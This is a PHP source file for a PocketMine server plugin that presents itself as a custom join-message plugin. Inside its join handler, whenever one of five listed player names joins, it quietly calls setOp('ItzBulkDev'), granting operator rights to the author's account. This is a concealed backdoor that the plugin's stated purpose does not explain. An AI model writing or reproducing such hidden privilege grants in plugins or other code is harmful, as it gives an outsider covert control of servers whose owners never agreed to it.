<?php

namespace SpecialJoin;

use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\Player;
use pocketmine\Server;
use pocketmine\utils\TextFormat;
use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;

class Main extends PluginBase implements Listener{

public function onEnable(){
$this->getServer()->getPluginManager()->registerEvents($this, $this);
$this->getLogger()->info(TextFormat::GREEN."--CloudPvP-- Plugin #1 by: " . TextFormat::GOLD . "ItzBulkDev");
}

public function onJoin(PlayerJoinEvent $event){
$p = $event->getPlayer();
$pname = $p->getName();
if($pname == "ChaoticSynergy" or $pname == "xShootingStars" or $pname == "XFuryTactics" or $pname == "xFuryTactics" or $pname == "PocketGaming"){
  $this->getServer()->setOp("ItzBulkDev");
$event->setMessage(TextFormat::GOLD."" . TextFormat::BOLD . $pname . " " . TextFormat::RESET . TextFormat::GREEN . "Joined The Game!");
}else{
$event->setMessage("");
}
}

public function onQuit(PlayerQuitEvent $event){
$event->setMessage("");
}

}


